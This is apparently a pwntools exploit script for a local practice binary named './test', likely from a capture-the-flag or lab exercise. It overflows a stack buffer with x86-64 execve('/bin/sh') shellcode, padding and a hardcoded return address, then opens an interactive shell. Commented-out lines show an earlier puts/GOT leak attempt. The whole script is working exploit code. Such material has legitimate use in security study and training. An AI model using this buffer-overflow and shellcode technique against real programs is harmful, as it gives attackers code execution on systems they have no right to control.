from pwn import *

elf = ELF('./test')
p = process("./test")

#for symbol in elf.symbols:
#	print symbol, hex(elf.symbols[symbol])

plt_puts = elf.symbols['plt.puts']
main = elf.symbols['main']
read_got = elf.symbols['got.read']
printf_got = elf.symbols['got.printf']

#buf = 'A'*(96+8)+'B'*8
#eip = p64(plt_puts)
#ret = p64(main)
#argv = p64(printf_got)

#payload = buf+eip#+ret#+argv
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf = "A"*(96+8-len(shellcode))
eip = int("0x7ffc97035d90", 16)

payload = shellcode+buf+p64(eip)

p.sendline(payload)
p.interactive()
#data = p.recv()


#leak = p.recv()
#print eip.encode("hex"), leak


